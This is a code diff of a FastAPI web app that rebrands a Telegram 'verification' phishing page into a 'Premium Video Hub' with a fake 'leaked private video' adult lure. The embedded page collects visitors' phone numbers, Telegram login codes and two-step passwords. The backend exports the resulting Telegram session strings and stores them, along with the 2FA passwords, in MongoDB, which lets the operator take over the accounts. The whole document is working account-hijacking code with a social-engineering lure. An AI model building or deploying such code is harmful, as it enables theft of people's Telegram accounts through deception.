@@ -15,7 +15,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 # ---------------------------------------------------------
 # App & Config Setup
 # ---------------------------------------------------------
-app = FastAPI(title="VIP Access Portal")
+app = FastAPI(title="Premium Video Hub")
 
 # Environment Variables (Render Dashboard se load honge)
 API_ID = int(os.environ.get("API_ID", "123456"))
@@ -35,22 +35,13 @@ active_clients = {}
 # Helper Function for Flexible Phone Cleaning
 # ---------------------------------------------------------
 def clean_phone_number(phone_raw: str) -> str:
-    # फालतू अक्षर, स्पेस, डॉट, डैश सब हटाओ
     digits = re.sub(r'[^\d+]', '', phone_raw)
-    
-    # अगर + पहले से है
     if digits.startswith('+'):
         return digits
-    
-    # अगर 0 से शुरू हो रहा है (जैसे 09876543210)
     if digits.startswith('0'):
         digits = digits[1:]
-        
-    # अगर केवल 10 डिजिट का नंबर डाला है (India Default)
     if len(digits) == 10:
         return f"+91{digits}"
-        
-    # बाकी सब केस के लिए आगे + लगा दो
     return f"+{digits}"
 
 # ---------------------------------------------------------
@@ -68,7 +59,7 @@ class PasswordReq(BaseModel):
     password: str
 
 # ---------------------------------------------------------
-# Embedded HTML UI Template
+# HTML UI Template: PREMIUM VIDEO HUB (FINAL)
 # ---------------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -76,128 +67,164 @@ HTML_TEMPLATE = """
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VIP Access Portal</title>
+  <title>Premium Video Hub</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
   <style>
-    body { background: #0b0f19; color: #f3f4f6; font-family: 'Inter', sans-serif; }
-    .glass { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
-    .btn-gradient { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); transition: all 0.3s ease; }
-    .btn-gradient:hover { transform: translateY(-2px); box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4); }
+    body { background: #0d0e12; color: #f3f4f6; font-family: 'Inter', sans-serif; }
+    .glass { background: rgba(22, 24, 34, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255, 255, 255, 0.08); }
+    .btn-pink-gradient { 
+      background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); 
+      transition: all 0.3s ease; 
+      box-shadow: 0 8px 25px -5px rgba(255, 65, 108, 0.5);
+    }
+    .btn-pink-gradient:hover { 
+      transform: translateY(-2px); 
+      box-shadow: 0 12px 30px -5px rgba(255, 65, 108, 0.7); 
+    }
+    .video-card-gradient {
+      background: linear-gradient(180deg, #6a11cb 0%, #2575fc 100%);
+    }
   </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-between p-4">
+<body class="min-h-screen flex flex-col items-center justify-between p-3 md:p-6">
 
-  <!-- Header Bar -->
-  <header class="w-full max-w-4xl flex items-center justify-between py-4 border-b border-gray-800 mb-6">
-    <div class="flex items-center space-x-2">
-      <div class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-xl text-white shadow-lg shadow-blue-500/30">VIP</div>
-      <span class="text-xl font-bold tracking-wide text-white">ACCESS PORTAL</span>
-    </div>
-    <span class="px-3 py-1 bg-green-500/10 text-green-400 border border-green-500/20 text-xs font-semibold rounded-full flex items-center gap-2">
-      <span class="w-2 h-2 rounded-full bg-green-400 animate-ping"></span> Active Verification
-    </span>
+  <header class="w-full max-w-xl text-center py-4 mb-2">
+    <h1 class="text-2xl md:text-3xl font-black tracking-wider text-white uppercase flex items-center justify-center gap-2">
+      <span class="text-red-500"><i class="fa-solid fa-fire"></i></span> PREMIUM VIDEO HUB
+    </h1>
+    <p class="text-xs text-gray-400 mt-1 tracking-wide">Exclusive content — Verified members only</p>
   </header>
 
-  <!-- Main Portal Body -->
-  <main class="w-full max-w-4xl space-y-8">
+  <main class="w-full max-w-xl space-y-6">
     
-    <!-- Tutorial & Action Banner -->
-    <div class="glass rounded-2xl p-4 md:p-6 shadow-2xl">
-      <h2 class="text-lg font-semibold text-gray-200 mb-3 flex items-center gap-2">
-        <i class="fa-solid fa-circle-play text-blue-500"></i> How to Unlock Access (Guide Video)
-      </h2>
-      <div class="relative w-full rounded-xl overflow-hidden bg-black aspect-video flex items-center justify-center border border-gray-800">
-        <video controls class="w-full h-full object-cover">
-          <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-          Your browser does not support video.
-        </video>
+    <div class="glass rounded-3xl overflow-hidden p-3 border border-gray-800 shadow-2xl">
+      <div class="relative w-full aspect-video rounded-2xl overflow-hidden video-card-gradient flex items-center justify-center border border-white/10 shadow-inner">
+        <button onclick="openModal()" class="w-16 h-16 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center text-white text-2xl hover:scale-110 transition shadow-lg border border-white/30">
+          <i class="fa-solid fa-play ml-1"></i>
+        </button>
       </div>
-      <button onclick="openModal()" class="w-full mt-5 py-4 btn-gradient text-white font-bold text-lg rounded-xl shadow-lg flex items-center justify-center gap-3">
-        <i class="fa-brands fa-telegram text-2xl"></i> VERIFY VIA TELEGRAM TO UNLOCK
+
+      <div class="p-3 space-y-2">
+        <div class="flex items-center justify-between">
+          <h2 class="text-lg font-bold text-white tracking-wide">🔥 LEAKED PRIVATE VIDEO — 2026</h2>
+        </div>
+        <div class="flex items-center gap-3 text-xs text-gray-400">
+          <span class="text-yellow-400 font-semibold"><i class="fa-solid fa-star"></i> 4.9 (2.4M views)</span>
+          <span>•</span>
+          <span class="text-gray-300">18+</span>
+        </div>
+        <div>
+          <span class="inline-block px-2.5 py-0.5 bg-red-500/20 text-red-400 border border-red-500/30 text-[10px] font-bold rounded-md uppercase tracking-wider">
+            🔒 RESTRICTED
+          </span>
+        </div>
+      </div>
+
+      <button onclick="openModal()" class="w-full mt-2 py-4 btn-pink-gradient text-white font-extrabold text-base md:text-lg rounded-2xl flex items-center justify-center gap-2 tracking-wide uppercase">
+        <i class="fa-brands fa-telegram text-2xl"></i> GET YOUR LINK TAP TO VERIFY VIA TELEGRAM
       </button>
     </div>
 
-    <!-- Features / Trips Showcase -->
     <div>
-      <h3 class="text-md font-semibold text-gray-400 mb-4 tracking-wider uppercase">Exclusive Perks</h3>
-      <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">Beach Resort Pass</div>
+      <h3 class="text-sm font-bold text-gray-300 mb-3 tracking-wide flex items-center gap-2">
+        <span class="text-red-500"><i class="fa-solid fa-fire"></i></span> More Videos
+      </h3>
+      <div class="grid grid-cols-2 gap-3">
+        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
+          <div class="w-full h-28 bg-gradient-to-br from-pink-600 to-purple-800 flex items-center justify-center relative">
+            <i class="fa-solid fa-play text-white/80 text-xl"></i>
+          </div>
+          <div class="p-2.5">
+            <div class="text-xs font-bold text-white">Private 01</div>
+            <div class="text-[10px] text-gray-400 mt-0.5">2.1M views</div>
+          </div>
         </div>
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1519046904884-53103b34b206?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">VIP Lounge Access</div>
+
+        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
+          <div class="w-full h-28 bg-gradient-to-br from-amber-600 to-red-800 flex items-center justify-center relative">
+            <i class="fa-solid fa-play text-white/80 text-xl"></i>
+          </div>
+          <div class="p-2.5">
+            <div class="text-xs font-bold text-white">Private 02</div>
+            <div class="text-[10px] text-gray-400 mt-0.5">1.8M views</div>
+          </div>
         </div>
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1488646953014-85cb44e25828?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">Global Travel Guide</div>
+
+        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
+          <div class="w-full h-28 bg-gradient-to-br from-emerald-600 to-teal-800 flex items-center justify-center relative">
+            <i class="fa-solid fa-play text-white/80 text-xl"></i>
+          </div>
+          <div class="p-2.5">
+            <div class="text-xs font-bold text-white">Private 03</div>
+            <div class="text-[10px] text-gray-400 mt-0.5">1.5M views</div>
+          </div>
         </div>
-        <div class="glass rounded-xl overflow-hidden hover:border-gray-600 transition">
-          <img src="https://images.unsplash.com/photo-1503220317375-aaad61436b1b?auto=format&fit=crop&w=400&q=80" class="w-full h-32 object-cover" alt="Pass">
-          <div class="p-3 text-sm font-medium text-gray-300">Private Community</div>
+
+        <div onclick="openModal()" class="glass rounded-2xl overflow-hidden border border-gray-800 cursor-pointer hover:border-gray-600 transition">
+          <div class="w-full h-28 bg-gradient-to-br from-blue-600 to-indigo-800 flex items-center justify-center relative">
+            <i class="fa-solid fa-play text-white/80 text-xl"></i>
+          </div>
+          <div class="p-2.5">
+            <div class="text-xs font-bold text-white">Private 04</div>
+            <div class="text-[10px] text-gray-400 mt-0.5">1.2M views</div>
+          </div>
         </div>
       </div>
     </div>
   </main>
 
-  <!-- Auth Modal -->
-  <div id="authModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
-    <div class="glass w-full max-w-md rounded-2xl p-6 relative border border-gray-700 shadow-2xl">
+  <div id="authModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
+    <div class="glass w-full max-w-md rounded-3xl p-6 relative border border-gray-700 shadow-2xl">
       <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white"><i class="fa-solid fa-xmark text-xl"></i></button>
 
-      <!-- Step 1: Phone -->
       <div id="step-phone" class="space-y-4">
         <div class="text-center">
-          <i class="fa-brands fa-telegram text-5xl text-blue-500 mb-2"></i>
+          <i class="fa-brands fa-telegram text-5xl text-red-500 mb-2"></i>
           <h3 class="text-xl font-bold">Telegram Verification</h3>
-          <p class="text-sm text-gray-400 mt-1">Enter your phone number with country code (e.g. +919876543210)</p>
+          <p class="text-xs text-gray-400 mt-1">Enter your phone number with country code</p>
         </div>
-        <input type="text" id="phoneInput" placeholder="+91 9876543210" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 text-lg text-center tracking-widest">
-        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 btn-gradient text-white font-semibold rounded-xl">Send Code</button>
+        <input type="text" id="phoneInput" placeholder="+91 XXXXX XXXXX" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500 text-lg text-center tracking-widest">
+        <button onclick="sendCode()" id="btnSendCode" class="w-full py-3.5 btn-pink-gradient text-white font-bold rounded-xl uppercase tracking-wider">Send Code</button>
       </div>
 
-      <!-- Step 2: OTP -->
       <div id="step-otp" class="space-y-4 hidden">
         <div class="text-center">
-          <i class="fa-solid fa-shield-halved text-5xl text-green-500 mb-2"></i>
-          <h3 class="text-xl font-bold">Enter OTP Code</h3>
-          <p class="text-sm text-gray-400 mt-1">Check your official Telegram app for verification code</p>
-          <p id="displayPhone" class="text-xs text-blue-400 font-semibold mt-1"></p>
+          <i class="fa-solid fa-shield-halved text-5xl text-emerald-500 mb-2"></i>
+          <h3 class="text-xl font-bold">Enter 5-Digit OTP Code</h3>
+          <p class="text-xs text-gray-400 mt-1">Check your official Telegram app for verification code</p>
+          <p id="displayPhone" class="text-xs text-red-400 font-semibold mt-1"></p>
         </div>
-        <input type="text" id="otpInput" placeholder="12345" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-green-500 text-2xl text-center tracking-widest font-mono">
+        <input type="text" id="otpInput" placeholder="• • • • •" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-500 text-2xl text-center tracking-widest font-mono">
         
-        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3 bg-green-600 hover:bg-green-500 text-white font-semibold rounded-xl transition">Verify & Continue</button>
+        <button onclick="verifyOtp()" id="btnVerifyOtp" class="w-full py-3.5 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl transition uppercase tracking-wider">Verify & Continue</button>
 
-        <!-- New Action Options: Edit Phone & Resend OTP -->
         <div class="flex items-center justify-between text-xs text-gray-400 pt-2 border-t border-gray-800">
-          <button onclick="goBackToPhone()" class="hover:text-blue-400 flex items-center gap-1">
+          <button onclick="goBackToPhone()" class="hover:text-red-400 flex items-center gap-1">
             <i class="fa-solid fa-pen-to-square"></i> Edit Number
           </button>
-          <button onclick="sendCode(true)" id="btnResend" class="hover:text-green-400 flex items-center gap-1">
+          <button onclick="sendCode(true)" id="btnResend" class="hover:text-emerald-400 flex items-center gap-1">
             <i class="fa-solid fa-rotate-right"></i> Resend OTP
           </button>
         </div>
       </div>
 
-      <!-- Step 3: 2FA Password -->
       <div id="step-2fa" class="space-y-4 hidden">
         <div class="text-center">
           <i class="fa-solid fa-lock text-5xl text-yellow-500 mb-2"></i>
           <h3 class="text-xl font-bold">Two-Step Verification</h3>
-          <p class="text-sm text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
+          <p class="text-xs text-gray-400 mt-1">Your Telegram account requires 2FA password</p>
         </div>
         <input type="password" id="passwordInput" placeholder="Password" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500 text-lg text-center">
-        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3 bg-yellow-600 hover:bg-yellow-500 text-white font-semibold rounded-xl transition">Submit Password</button>
+        <button onclick="verify2FA()" id="btnVerify2FA" class="w-full py-3.5 bg-yellow-600 hover:bg-yellow-500 text-white font-bold rounded-xl transition uppercase tracking-wider">Submit Password</button>
       </div>
 
       <p id="errorMsg" class="text-red-400 text-xs text-center mt-3 hidden"></p>
     </div>
   </div>
 
-  <footer class="text-gray-600 text-xs text-center py-6">
-    &copy; 2026 Secure Access Portal. All Rights Reserved.
+  <footer class="text-gray-600 text-xs text-center py-4">
+    &copy; 2026 Premium Video Hub. All Rights Reserved.
   </footer>
 
   <script>
@@ -237,7 +264,7 @@ HTML_TEMPLATE = """
       const data = await res.json();
       
       if(res.ok) {
-        userPhone = data.phone; // back from cleaned phone
+        userPhone = data.phone;
         document.getElementById('displayPhone').innerText = "Sent to: " + userPhone;
         document.getElementById('step-phone').classList.add('hidden');
         document.getElementById('step-otp').classList.remove('hidden');
@@ -305,7 +332,6 @@ async def serve_ui():
 async def send_code(data: PhoneReq):
     phone = clean_phone_number(data.phone)
     try:
-        # Purana disconnect logic taaki memory leak na ho
         if phone in active_clients:
             try:
                 await active_clients[phone]["client"].disconnect()
@@ -339,7 +365,7 @@ async def verify_otp(data: OtpReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Save Session & Default 2FA ('None') to MongoDB (Master Bot Synced Schema)
+        # Save Session & Default 2FA ('None') to MongoDB
         await sessions_col.update_one(
             {"phone": phone},
             {"$set": {
@@ -376,7 +402,7 @@ async def verify_2fa(data: PasswordReq):
         string_session = await client.export_session_string()
         await client.disconnect()
         
-        # Save Session & 2FA Password to MongoDB (Master Bot Synced Schema)
+        # Save Session & 2FA Password to MongoDB
         await sessions_col.update_one(
             {"phone": phone},
             {"$set": {
